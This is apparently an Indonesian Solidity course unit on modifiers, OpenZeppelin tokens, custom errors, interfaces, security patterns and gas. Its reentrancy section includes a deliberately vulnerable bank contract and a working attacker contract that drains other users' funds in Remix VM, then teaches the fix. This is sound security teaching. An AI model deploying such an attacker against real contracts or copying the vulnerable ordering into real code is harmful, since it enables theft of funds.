---
sidebar_position: 2
title: 🧠 Unit 2 — Solidity Lanjutan
description: Modifier, inheritance & OpenZeppelin, custom error, struct & array, interface, pola keamanan (reentrancy live demo), dan gas — masing-masing dibangun sebagai contract kecil dan langsung diuji di Remix.
---

# 🧠 Unit 2 — Solidity Lanjutan

:::info Goal Unit Ini
Di akhir unit ini kamu akan:
- Bisa memakai **modifier** untuk kontrol akses
- Paham **inheritance** dan cara memakai library seperti OpenZeppelin — termasuk membuat **token ERC-20** dalam belasan baris
- Bisa memakai **custom error**, **struct**, **array**, dan **interface**
- Paham pola keamanan penting: **reentrancy**, **kontrol akses**, **integer** — dan **melihat sendiri** serangan reentrancy berhasil lalu menutupnya
- Punya intuisi dasar tentang **gas**
:::

:::note Prasyarat
- ✅ [Unit 1](./solidity-dasar) selesai — kamu sudah men-deploy dan menguji beberapa contract di Remix, dan paham `mapping`, `require`, `event`, dan `payable`
:::

:::tip Format unit ini sama seperti Unit 1
Setiap konsep tetap: **satu contract kecil → deploy → klik → lihat hasilnya.** Blok **🧪 Coba di Remix** memberi langkah klik konkret dan **hasil yang seharusnya kamu lihat**.

Tetap pakai **Remix VM** (blockchain simulasi di browser) untuk semua latihan — gratis, instan, dan memberimu beberapa akun uji yang akan kita manfaatkan lagi di sini, terutama untuk menguji kontrol akses dan reentrancy.
:::

---

## 🛡️ Modifier — Aturan yang Bisa Dipakai Ulang

**Apa itu:** pembungkus validasi yang bisa dipasang ke banyak function sekaligus.

**Kenapa penting:** di Unit 1, setiap function yang butuh cek "hanya pemilik" harus menulis `require` sendiri. Kalau ada sepuluh function seperti itu, kamu menyalin baris yang sama sepuluh kali — dan cukup lupa sekali saja untuk membuka celah keamanan. Modifier menyelesaikan ini.

Buat `BelajarModifier.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract BelajarModifier {
    address public pemilik;
    uint256 public batasMaksimal;

    constructor() {
        pemilik = msg.sender;
    }

    // Modifier: cek dulu, baru jalankan function
    modifier hanyaPemilik() {
        require(msg.sender == pemilik, "Bukan pemilik");
        _;   // di sini badan function disisipkan
    }

    function setBatas(uint256 _batas) public hanyaPemilik {
        batasMaksimal = _batas;
    }

    function gantiPemilik(address _baru) public hanyaPemilik {
        require(_baru != address(0), "Alamat nol tidak boleh");
        pemilik = _baru;
    }
}
```

**Penjelasan:**

- `modifier hanyaPemilik() { ... }` — mendefinisikan aturan yang bisa dipakai ulang.
- Tanda `_;` adalah **tempat badan function disisipkan.** Jadi urutannya: cek `require` dulu, baru isi function berjalan.
- `public hanyaPemilik` — memasang modifier itu ke sebuah function. Sekarang `setBatas` dan `gantiPemilik` sama-sama terlindungi hanya dengan menambahkan satu kata.

:::warning Kenapa ada `require(_baru != address(0))`
Alamat nol (`0x000...0`) adalah alamat yang tidak dimiliki siapa pun.

Kalau kamu mentransfer kepemilikan ke alamat nol, **contract-mu terkunci selamanya** — tidak akan ada lagi yang bisa memanggil function `hanyaPemilik`. Ini kesalahan yang benar-benar pernah terjadi di proyek sungguhan. Selalu validasi alamat sebelum menyimpannya.
:::

#### 🧪 Coba di Remix

1. Compile → Deploy **dari akun pertama** (akun ini jadi `pemilik`)
2. Ketik `100` di `setBatas` → klik → cek `batasMaksimal` → **Hasil: `100`** ✅
3. **Ganti ke akun kedua** di dropdown **ACCOUNT**
4. Ketik `999` di `setBatas` → klik

   → **Hasil: GAGAL** dengan `"Bukan pemilik"` — satu modifier melindungi function tanpa menyalin `require` ke mana-mana ✅

5. Masih di akun kedua, cek `batasMaksimal` → **Hasil: tetap `100`** (transaksi tadi dibatalkan seluruhnya)
6. Kembali ke akun pertama, coba `gantiPemilik` dengan `0x0000000000000000000000000000000000000000`

   → **Hasil: GAGAL** dengan `"Alamat nol tidak boleh"` — validasi menyelamatkanmu dari mengunci contract ✅

---

## 🧬 Inheritance — Mewarisi Contract Lain

**Apa itu:** membuat contract mewarisi variabel dan function dari contract lain.

**Kenapa penting:** ini yang memungkinkanmu memakai kode teruji orang lain (seperti OpenZeppelin) alih-alih menulis semuanya dari nol.

Buat `BelajarInheritance.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Induk {
    function sapa() public pure virtual returns (string memory) {
        return "Halo dari induk";
    }
}

contract Anak is Induk {
    function sapa() public pure override returns (string memory) {
        return "Halo dari anak";
    }

    function sapaInduk() public pure returns (string memory) {
        return super.sapa();   // memanggil versi induk
    }
}
```

**Penjelasan:**

- `is` menandai pewarisan — `Anak is Induk`.
- `virtual` = function ini **boleh** ditimpa oleh turunannya.
- `override` = function ini **menimpa** milik induk.
- `super.sapa()` = memanggil versi induk secara eksplisit, meski sudah ditimpa.

#### 🧪 Coba di Remix

1. Compile. Di dropdown **CONTRACT** (di tab Deploy) akan muncul beberapa contract — pilih **`Anak`** → Deploy
2. Klik `sapa` → **Hasil: `Halo dari anak`** (versi yang menimpa) ✅
3. Klik `sapaInduk` → **Hasil: `Halo dari induk`** (versi asli lewat `super`) ✅

:::note Kenapa dropdown CONTRACT penting
Satu file bisa berisi banyak contract. Remix men-deploy **yang sedang terpilih** di dropdown CONTRACT. Kalau kamu bingung kenapa tombol yang muncul tidak sesuai harapan, hampir selalu karena contract yang salah sedang terpilih.
:::

---

## 📦 Dalam Praktik — Token ERC-20 dengan OpenZeppelin

**Apa itu:** OpenZeppelin adalah pustaka contract standar yang sudah **diaudit** dan dipakai ribuan proyek.

**Kenapa penting:** kamu jarang menulis token dari nol. Mewarisi dari OpenZeppelin memberimu logika transfer, approval, dan pembukuan saldo yang sudah benar — kamu tinggal menambahkan bagian yang unik.

Buat `TokenCLC.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract TokenCLC is ERC20, Ownable {
    constructor()
        ERC20("CLC11 Token", "CLC11")
        Ownable(msg.sender)
    {
        // Cetak 1 juta token untuk pen-deploy
        _mint(msg.sender, 1000000 * 10 ** decimals());
    }

    // Hanya owner yang boleh mencetak token baru
    function mint(address ke, uint256 jumlah) public onlyOwner {
        _mint(ke, jumlah);
    }
}
```

**Penjelasan:**

- `import "@openzeppelin/..."` — Remix otomatis mengunduh library ini dari npm. Tidak perlu setup.
- `is ERC20, Ownable` — mewarisi **dua** contract sekaligus.
- `ERC20("CLC11 Token", "CLC11")` — memanggil constructor induk untuk memberi nama dan simbol token.
- `Ownable(msg.sender)` — menjadikan pen-deploy sebagai owner.
- `_mint(...)` dan `onlyOwner` — keduanya diwarisi; kamu tidak menulisnya sendiri.

:::tip Jangan menulis ulang yang sudah teruji
Kode standar seperti token, kontrol akses, dan proteksi reentrancy sudah ditulis, diaudit, dan dipakai ribuan proyek.

Menulis sendiri versimu bukan tanda kemampuan — itu menambah risiko tanpa manfaat. Pakai OpenZeppelin, lalu habiskan energimu untuk bagian yang benar-benar unik dari proyekmu.
:::

#### 🧪 Coba di Remix

1. Compile (butuh beberapa detik lebih lama — Remix sedang mengunduh OpenZeppelin) → pilih contract **`TokenCLC`** → Deploy dari **akun pertama**
2. Klik `name` → **Hasil: `CLC11 Token`**, klik `symbol` → **Hasil: `CLC11`** ✅
3. Salin alamat akun pertama, tempel ke `balanceOf` → klik

   → **Hasil: `1000000000000000000000000`** (1 juta token, 18 desimal) ✅

4. Sekarang transfer. Isi `transfer`: `to` = alamat **akun kedua**, `amount` = `1000000000000000000000` (1000 token) → klik
5. Cek `balanceOf` untuk akun kedua → **Hasil: `1000000000000000000000`** ✅
6. **Ganti ke akun kedua**, coba `mint` ke dirimu sendiri dengan jumlah berapa pun

   → **Hasil: GAGAL** — `mint` dilindungi `onlyOwner`, dan akun kedua bukan owner ✅

7. Kembali ke akun pertama, `mint` 500 token ke siapa pun → berhasil ✅

:::note Kamu baru saja membuat token yang berfungsi penuh
Contract belasan baris ini adalah token ERC-20 sungguhan. Kalau di-deploy ke Injective EVM testnet (lihat [Unit 3](./deploy-ke-injective-evm)), ia bisa dilihat di explorer, ditransfer antar-wallet, dan ditambahkan ke MetaMask seperti token lainnya. Itulah kekuatan mewarisi standar.
:::

---

## ❗ Custom Error — Lebih Murah dari String

**Apa itu:** cara melaporkan kegagalan yang lebih hemat daripada pesan `require` berupa string.

**Kenapa penting:** string `"Tabungan tidak cukup"` disimpan di dalam bytecode contract dan memakan gas. Custom error tidak, dan bisa **membawa data** yang berguna untuk debugging.

Buat `BelajarCustomError.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Deklarasi di luar contract
error TabunganTidakCukup(uint256 diminta, uint256 tersedia);

contract BelajarCustomError {
    mapping(address => uint256) public tabungan;

    function setor() public payable {
        tabungan[msg.sender] += msg.value;
    }

    function menarik(uint256 jumlah) public {
        uint256 saldo = tabungan[msg.sender];

        // Cara lama (string): require(jumlah <= saldo, "Tabungan tidak cukup");
        // Cara hemat (custom error):
        if (jumlah > saldo) {
            revert TabunganTidakCukup(jumlah, saldo);
        }

        tabungan[msg.sender] = saldo - jumlah;
        (bool sukses, ) = msg.sender.call{value: jumlah}("");
        require(sukses, "Pengiriman gagal");
    }
}
```

**Penjelasan:**

- `error TabunganTidakCukup(...)` — mendeklarasikan error, biasanya di luar contract.
- `revert NamaError(...)` — memicu error itu dan **membatalkan transaksi**, sama seperti `require` yang gagal.
- Bedanya: error ini **membawa dua angka** (`diminta` dan `tersedia`), jadi saat debugging kamu tahu persis berapa selisihnya.

#### 🧪 Coba di Remix

1. Compile → Deploy
2. Isi **VALUE** = `1` **Ether** → klik `setor`
3. Cek `tabungan` dengan alamatmu → **Hasil: `1000000000000000000`** ✅
4. Coba tarik lebih banyak: ketik `5000000000000000000` (5 INJ) di `menarik` → klik
5. Buka **Terminal**, klik transaksi yang gagal itu

   → **Hasil: transaksi ter-revert dengan `TabunganTidakCukup`**, dan **membawa angka** `diminta: 5000000000000000000, tersedia: 1000000000000000000` ✅

:::tip Inilah keunggulan yang tidak terlihat dari string
Pesan string hanya bisa memberi tahu *bahwa* sesuatu gagal. Custom error memberi tahu *seberapa jauh* gagalnya. Saat men-debug transaksi orang lain yang gagal di explorer, data seperti ini menghemat banyak waktu.
:::

---

## 📚 Struct dan Array

**Apa itu:** `struct` mengelompokkan beberapa variabel jadi satu tipe; `array` menyimpan daftar berurutan yang bisa bertambah.

**Kenapa penting:** hampir semua contract nyata mengelola *koleksi* item kompleks — daftar peserta, daftar campaign, daftar order. Ini kombinasi yang kamu pakai untuk itu.

Buat `DaftarPeserta.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract DaftarPeserta {
    struct Peserta {
        string nama;
        address wallet;
        uint256 poin;
        bool lulus;
    }

    // Array dinamis berisi struct
    Peserta[] public peserta;

    // Alamat → posisinya di array, biar mudah dicari
    mapping(address => uint256) public indeksPeserta;

    function daftar(string memory _nama) public {
        peserta.push(Peserta({
            nama: _nama,
            wallet: msg.sender,
            poin: 0,
            lulus: false
        }));
        indeksPeserta[msg.sender] = peserta.length - 1;
    }

    function tambahPoin(uint256 _jumlah) public {
        uint256 i = indeksPeserta[msg.sender];
        peserta[i].poin += _jumlah;
    }

    function jumlahPeserta() public view returns (uint256) {
        return peserta.length;
    }
}
```

**Penjelasan:**

- `struct Peserta { ... }` — tipe kustom yang menggabungkan empat data.
- `Peserta[] public peserta;` — array dinamis; `.push(...)` menambah di akhir, `.length` menghitung isinya.
- `peserta[i].poin += _jumlah` — mengakses satu field dari satu elemen array.
- Mapping `indeksPeserta` dipakai supaya kita bisa menemukan posisi seseorang tanpa harus men-loop seluruh array.

#### 🧪 Coba di Remix

1. Compile → Deploy dari **akun pertama**
2. Ketik `"Budi"` di `daftar` → klik
3. **Ganti ke akun kedua** → ketik `"Ani"` di `daftar` → klik
4. Klik `jumlahPeserta` → **Hasil: `2`** ✅
5. Ketik `0` di `peserta` → **Hasil: data Budi** (nama, alamat akun pertama, poin 0, lulus false)
6. Ketik `1` di `peserta` → **Hasil: data Ani** ✅
7. Masih sebagai akun kedua, ketik `50` di `tambahPoin` → klik → cek `peserta` indeks `1`

   → **Hasil: poin Ani = `50`**, poin Budi tetap `0` ✅

:::danger Jangan pernah loop array yang bisa tumbuh tanpa batas
Ini kesalahan desain klasik yang mematikan contract:

```solidity
// ❌ BERBAHAYA
function bagikanHadiah() public {
    for (uint256 i = 0; i < peserta.length; i++) {
        // kirim hadiah ke peserta[i]
    }
}
```

Setiap blok punya **batas gas**. Kalau array-nya tumbuh cukup besar, loop ini akan melebihi batas dan **transaksinya selalu gagal** — selamanya. Function itu jadi mati permanen, dan tidak ada cara memperbaikinya karena contract tidak bisa diubah.

**Pola yang benar: biarkan pengguna mengambil sendiri (pull), jangan kamu yang mengirim ke semua orang (push).**

```solidity
// ✅ AMAN
mapping(address => uint256) public hadiahTertunda;

function klaimHadiah() public {
    uint256 jumlah = hadiahTertunda[msg.sender];
    require(jumlah > 0, "Tidak ada hadiah");
    hadiahTertunda[msg.sender] = 0;
    (bool sukses, ) = msg.sender.call{value: jumlah}("");
    require(sukses, "Gagal");
}
```

Setiap pengguna membayar gas-nya sendiri, dan tidak ada loop yang bisa meledak.
:::

---

## 🔌 Interface — Bicara dengan Contract Lain

**Apa itu:** deklarasi function apa saja yang dimiliki contract lain, tanpa isinya — cukup untuk memanggilnya.

**Kenapa penting:** ini fondasi **komposabilitas**, kemampuan aplikasi Web3 saling memakai seperti balok Lego. Untuk memanggil token orang lain, kamu tidak butuh kode lengkapnya, cukup tahu bentuk function-nya.

Kita uji ini dengan **dua contract di satu file** — sebuah token sederhana dan sebuah pembaca yang memanggilnya lewat interface.

Buat `BelajarInterface.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Interface: cuma bentuk function, tanpa isi
interface IToken {
    function balanceOf(address pemilik) external view returns (uint256);
}

// Token kecil untuk diuji
contract TokenMini {
    mapping(address => uint256) public saldo;

    function cetakUntukSaya(uint256 jumlah) public {
        saldo[msg.sender] += jumlah;
    }

    function balanceOf(address pemilik) external view returns (uint256) {
        return saldo[pemilik];
    }
}

// Contract lain yang membaca token di atas TANPA tahu isinya
contract PembacaSaldo {
    function cekSaldo(address token, address siapa) public view returns (uint256) {
        return IToken(token).balanceOf(siapa);
    }
}
```

**Penjelasan:**

- `interface IToken { ... }` — hanya mendeklarasikan `balanceOf`, tanpa badan function.
- `IToken(token)` — memberi tahu Solidity: "perlakukan alamat ini sebagai sesuatu yang punya function `balanceOf`".
- `PembacaSaldo` tidak tahu apa pun tentang isi `TokenMini` — cukup tahu bentuk function-nya. Itulah inti komposabilitas.

#### 🧪 Coba di Remix

1. Compile. Deploy **`TokenMini`** dulu → **salin alamatnya** (ikon copy di sebelah nama contract di Deployed Contracts)
2. Di `TokenMini`, ketik `777` di `cetakUntukSaya` → klik
3. Sekarang deploy **`PembacaSaldo`** (ganti pilihan di dropdown CONTRACT dulu)
4. Di `PembacaSaldo`, isi `cekSaldo`: `token` = alamat `TokenMini` yang tadi kamu salin, `siapa` = alamat akun aktifmu → klik

   → **Hasil: `777`** ✅ — satu contract berhasil membaca state contract lain, hanya berbekal interface

:::tip Kenapa ini besar
Di dunia nyata, `token` bisa berupa alamat token siapa pun yang sudah ada di chain — kamu tidak butuh source code-nya, cukup interface standarnya. Beginilah cara satu dApp memakai token, DEX, atau oracle yang dibuat orang lain. Kamu akan memakai persis pola ini di [Phase 3](../../Phase-3-Building/TS-SDK/setup-injective-ts-sdk).
:::

---

## 🔒 Tiga Pola Keamanan yang Wajib Kamu Kuasai

### 1. Reentrancy — Sekarang Kita Serang Sungguhan

**Apa itu:** serangan di mana contract penerima memanggil balik function-mu **sebelum** state-mu sempat diperbarui, lalu menguras dana.

**Kenapa penting:** ini pernah menyebabkan salah satu kerugian terbesar dalam sejarah Ethereum. Membacanya saja tidak cukup — di bawah ini kamu akan **menjalankan serangannya sendiri** di Remix VM, lalu menutupnya.

Buat `DemoReentrancy.sol` — berisi bank yang rentan dan penyerangnya:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ❌ BANK YANG RENTAN
contract BankRentan {
    mapping(address => uint256) public saldo;

    function setor() public payable {
        saldo[msg.sender] += msg.value;
    }

    function tarik() public {
        uint256 jumlah = saldo[msg.sender];
        require(jumlah > 0, "Kosong");

        // ❌ KIRIM DULU, baru nol-kan — inilah celahnya
        (bool ok, ) = msg.sender.call{value: jumlah}("");
        require(ok, "Gagal");

        saldo[msg.sender] = 0;   // terlambat!
    }

    function saldoBank() public view returns (uint256) {
        return address(this).balance;
    }
}

// 😈 PENYERANG
contract Penyerang {
    BankRentan public bank;

    constructor(address _bank) {
        bank = BankRentan(_bank);
    }

    // Dipanggil otomatis setiap contract ini menerima INJ
    receive() external payable {
        // Selama bank masih punya cukup dana, tarik lagi
        if (address(bank).balance >= 1 ether) {
            bank.tarik();
        }
    }

    function serang() public payable {
        bank.setor{value: 1 ether}();   // setor 1 INJ dulu
        bank.tarik();                    // lalu picu penarikan berantai
    }

    function ambilJarahan() public {
        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
        require(ok);
    }
}
```

**Cara serangan ini bekerja:** saat `BankRentan` mengirim INJ ke `Penyerang`, function `receive()` milik penyerang jalan otomatis. Karena bank **mengirim dulu sebelum menol-kan saldo**, `receive()` bisa memanggil `tarik()` lagi — dan saldonya masih tercatat penuh. Berulang, sampai bank kosong.

#### 🧪 Coba di Remix — lihat serangannya berhasil

1. Compile. Deploy **`BankRentan`** dulu
2. Kita isi dulu banknya seolah ada nasabah lain. Dengan **akun kedua**, isi VALUE = `5` Ether → klik `setor` di `BankRentan`
3. Klik `saldoBank` → **Hasil: `5000000000000000000`** (5 INJ tersimpan)
4. Sekarang deploy **`Penyerang`**, isi field constructor `_bank` = alamat `BankRentan` → Deploy dari **akun pertama**
5. Di `Penyerang`, isi VALUE = `1` Ether → klik `serang`
6. Kembali ke `BankRentan`, klik `saldoBank`

   → **Hasil: `0` (atau mendekati nol)** — penyerang menyetor 1 INJ tapi keluar membawa **6 INJ**. Dana nasabah lain lenyap ✅ (secara mengerikan)

:::danger Kamu baru saja melihat kenapa urutan itu segalanya
Penyerang menaruh 1 INJ dan mengambil 6. Selisih 5 INJ itu adalah setoran akun kedua — dana orang lain. Di mainnet, ini uang sungguhan yang hilang permanen.

Sekarang mari tutup celahnya.
:::

**Perbaikannya** — cukup ubah urutan di `tarik()` menjadi **checks-effects-interactions**:

```solidity
// ✅ AMAN
function tarik() public {
    uint256 jumlah = saldo[msg.sender];
    require(jumlah > 0, "Kosong");     // Checks

    saldo[msg.sender] = 0;             // Effects — nol-kan DULU

    (bool ok, ) = msg.sender.call{value: jumlah}("");  // Interactions — kirim terakhir
    require(ok, "Gagal");
}
```

#### 🧪 Coba di Remix — lihat serangan yang sama gagal

1. Ganti function `tarik()` di `BankRentan` dengan versi aman di atas → Compile ulang
2. Deploy `BankRentan` yang baru, isi lagi 5 INJ dari akun kedua
3. Deploy `Penyerang` baru dengan alamat bank yang baru → `serang` dengan VALUE 1 Ether

   → **Hasil: serangan gagal / hanya menarik 1 INJ miliknya sendiri.** Saat `receive()` memanggil `tarik()` lagi, saldonya sudah `0`, jadi `require(jumlah > 0)` menolaknya ✅

4. Klik `saldoBank` → **Hasil: masih `5000000000000000000`** — dana nasabah lain aman ✅

:::tip Satu baris yang dipindah = kerugian jutaan dolar dicegah
Yang berubah hanyalah **posisi** `saldo[msg.sender] = 0`. Itu saja. Untuk perlindungan berlapis, OpenZeppelin menyediakan `ReentrancyGuard` — modifier `nonReentrant` yang mencegah function dipanggil ulang sebelum selesai. Tetap: checks-effects-interactions adalah pertahanan pertamamu.
:::

### 2. Kontrol Akses

```solidity
// ❌ Siapa pun bisa memanggil ini dan menguras contract
function tarikSemuaDana() public {
    payable(msg.sender).transfer(address(this).balance);
}

// ✅ Dibatasi
function tarikSemuaDana() public hanyaPemilik {
    (bool ok, ) = pemilik.call{value: address(this).balance}("");
    require(ok, "Gagal");
}
```

:::warning Function tanpa pembatas = terbuka untuk semua
Setiap kali kamu menulis function yang mengubah state, tanyakan: **"apa yang terjadi kalau orang asing memanggil ini?"**

Kalau jawabannya buruk, function itu butuh modifier. Kamu sudah punya `hanyaPemilik` dari awal unit ini — pakai.
:::

### 3. Integer

Sejak Solidity 0.8.0, overflow dan underflow otomatis membatalkan transaksi. Tapi tetap waspadai:

- **Pembagian membuang sisa.** Kalikan sebelum membagi: `(a * 100) / b`, bukan `(a / b) * 100`
- **Perhatikan desimal.** Mencampur nilai 6-desimal (seperti USDC) dan 18-desimal (seperti INJ) adalah sumber bug yang sering terjadi

---

## ⛽ Berpikir tentang Gas

**Apa itu:** setiap operasi di contract punya harga, dibayar pemanggil dalam INJ.

**Kenapa penting:** operasi termahal jauh melampaui yang lain, jadi tahu yang mana membuat contract-mu jauh lebih murah dipakai.

| Operasi | Biaya relatif |
|---|---|
| Menulis ke state (slot baru) | 🔴 Sangat mahal |
| Menulis ke state (slot yang sudah terisi) | 🟠 Mahal |
| Membaca dari state | 🟡 Sedang |
| Memancarkan event | 🟢 Murah |
| Operasi di memori | 🟢 Sangat murah |

### Tiga kebiasaan hemat gas

**1. Cache variabel state di memori kalau dipakai berkali-kali**

```solidity
// ❌ membaca state 3x
function boros() public view returns (uint256) {
    return count + count + count;
}

// ✅ membaca state 1x
function hemat() public view returns (uint256) {
    uint256 c = count;
    return c + c + c;
}
```

**2. Pakai event untuk data yang hanya perlu dibaca dari luar chain**

Kalau frontend-mu butuh riwayat aktivitas, jangan simpan array di state — pancarkan event. Jauh lebih murah, seperti yang sudah kamu lihat di Unit 1.

**3. Rapatkan variabel kecil dalam satu slot**

```solidity
// ❌ 3 slot penyimpanan
uint256 a;
uint128 b;
uint128 c;

// ✅ 2 slot — b dan c muat bersama dalam satu slot 32-byte
uint128 b;
uint128 c;
uint256 a;
```

:::tip Cara benar-benar melihat perbedaan gas di Remix
Setiap kali kamu memanggil function yang menulis state, buka transaksinya di **Terminal** dan lihat field **`transaction cost`**. Coba panggil `boros` vs `hemat`, atau bandingkan menyimpan data di array vs memancarkan event — angkanya nyata dan langsung terlihat.

Tapi jangan terobsesi dulu:
:::

:::warning Jangan optimasi terlalu dini
Tulis kode yang **benar dan jelas** dulu. Baru optimasi kalau memang ada masalah.

Contract yang hemat gas tapi punya bug jauh lebih mahal daripada contract yang sedikit boros tapi aman. Prioritasnya: **benar → aman → jelas → hemat.**
:::

---

## 🧩 Tantangan — Tingkatkan `Celengan` Jadi `CelenganAman`

Ini menggabungkan hampir semua yang ada di unit ini. Ambil `Celengan` dari Unit 1 dan kembangkan **sendiri**.

### Spesifikasi

| Yang ditambahkan | Pakai konsep |
|---|---|
| Modifier `hanyaPemilik` | Modifier |
| `setBatasSetoran(uint256)` yang hanya bisa dipanggil pemilik | Modifier + kontrol akses |
| Ganti semua `require` berstring jadi **custom error** | Custom error |
| `struct Transaksi { uint256 jumlah; uint256 waktu; bool masukan; }` dan simpan riwayat per pengguna | Struct + array |
| `riwayatSaya()` yang mengembalikan array transaksi milik pemanggil | Array + view |
| Pastikan `menarik` memakai **checks-effects-interactions** | Keamanan |

### Kerangka awal

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// TODO 1: Deklarasikan custom error
// Contoh: error JumlahNol();
// Contoh: error MelebihiBatas(uint256 diminta, uint256 batas);
// Contoh: error BukanPemilik();


contract CelenganAman {
    struct Transaksi {
        uint256 jumlah;
        uint256 waktu;
        bool masukan;   // true = setor, false = tarik
    }

    address public pemilik;
    uint256 public batasSetoran;
    mapping(address => uint256) private tabungan;
    mapping(address => Transaksi[]) private riwayat;

    constructor() {
        pemilik = msg.sender;
        batasSetoran = 100 ether;
    }

    // TODO 2: Buat modifier hanyaPemilik() yang revert BukanPemilik()


    // TODO 3: setBatasSetoran — hanya pemilik


    // TODO 4: menabung — payable
    //   - revert JumlahNol() kalau msg.value == 0
    //   - revert MelebihiBatas(...) kalau melebihi batasSetoran
    //   - tambah tabungan, catat Transaksi(masukan = true)


    // TODO 5: menarik — checks-effects-interactions
    //   - revert kalau jumlah > tabungan
    //   - kurangi tabungan DULU, catat Transaksi(masukan = false), baru kirim


    // TODO 6: riwayatSaya() view returns (Transaksi[] memory)


    function tabunganSaya() public view returns (uint256) {
        return tabungan[msg.sender];
    }
}
```

### ✅ Checklist verifikasi

- [ ] Semua `require` berstring sudah jadi custom error
- [ ] `setBatasSetoran` gagal kalau dipanggil non-pemilik
- [ ] `menabung` menolak jumlah nol **dan** jumlah di atas batas
- [ ] `menarik` mengurangi saldo **sebelum** mengirim (urutan CEI)
- [ ] `riwayatSaya` mengembalikan array transaksimu
- [ ] Ter-compile tanpa error

### 🧪 Cara menguji hasilmu

1. Deploy dari akun pertama. `setBatasSetoran` ke `2000000000000000000` (2 INJ)
2. `menabung` dengan VALUE `1` Ether → berhasil. `menabung` dengan VALUE `3` Ether → **GAGAL `MelebihiBatas`** ✅
3. `menabung` dengan VALUE `0` → **GAGAL `JumlahNol`** ✅
4. **Ganti akun kedua** → `setBatasSetoran` → **GAGAL `BukanPemilik`** ✅
5. Kembali ke akun pertama, `menarik` `500000000000000000` → berhasil
6. Klik `riwayatSaya` → **Hasil: dua entri** — satu setoran, satu penarikan, dengan timestamp ✅

:::tip Kalau macet
Kerjakan satu TODO dalam satu waktu dan compile tiap selesai. Semua pola yang kamu butuhkan sudah muncul di contract-contract kecil di atas — buka lagi, salin polanya, sesuaikan namanya. Masih macet? Bawa kode dan pesan errornya ke grup Telegram.
:::

---

## 🎯 Rangkuman

:::tip Yang Harus Kamu Ingat
- **Modifier** untuk aturan yang dipakai berulang; selalu validasi `address(0)`
- Pakai **OpenZeppelin** untuk kode standar — kamu membuat token ERC-20 penuh dalam belasan baris
- **Custom error** lebih murah dari string `require` dan bisa membawa data untuk debugging
- **Jangan loop array tanpa batas** — pakai pola pull (pengguna mengklaim), bukan push
- **Interface** memungkinkan contract saling memanggil hanya dari bentuk function-nya — dasar komposabilitas
- **Reentrancy itu nyata** — kamu melihat sendiri 5 INJ dicuri, lalu ditutup hanya dengan memindah satu baris. **Checks → Effects → Interactions**
- Setiap function tulis tanpa pembatas terbuka untuk semua orang — beri modifier
- Gas: **menulis state itu mahal**, event murah, memori sangat murah; lihat `transaction cost` di Terminal
- **Benar dan aman dulu**, hemat gas belakangan
:::

### ✅ Quick Check

1. Apa fungsi `_;` di dalam modifier?
2. Kenapa mentransfer kepemilikan ke `address(0)` berbahaya?
3. Dalam demo reentrancy tadi, baris mana yang dipindah untuk menutup celahnya, dan kenapa itu berhasil?
4. Kenapa loop pada array yang tumbuh tanpa batas bisa mematikan function selamanya?
5. Sebutkan satu keunggulan custom error dibanding pesan `require` berupa string.
6. Operasi apa yang paling mahal dalam hal gas?

:::note Jawaban #3
Baris `saldo[msg.sender] = 0` dipindah ke **sebelum** pengiriman token (`call`). Dengan begitu, saat contract penyerang memanggil `tarik()` lagi lewat `receive()`, saldonya sudah nol dan `require(jumlah > 0)` menolaknya — penarikan berantai tidak pernah terjadi.
:::

---

**Lanjut:** [Unit 3 — Deploy ke Injective EVM](./deploy-ke-injective-evm) 👉
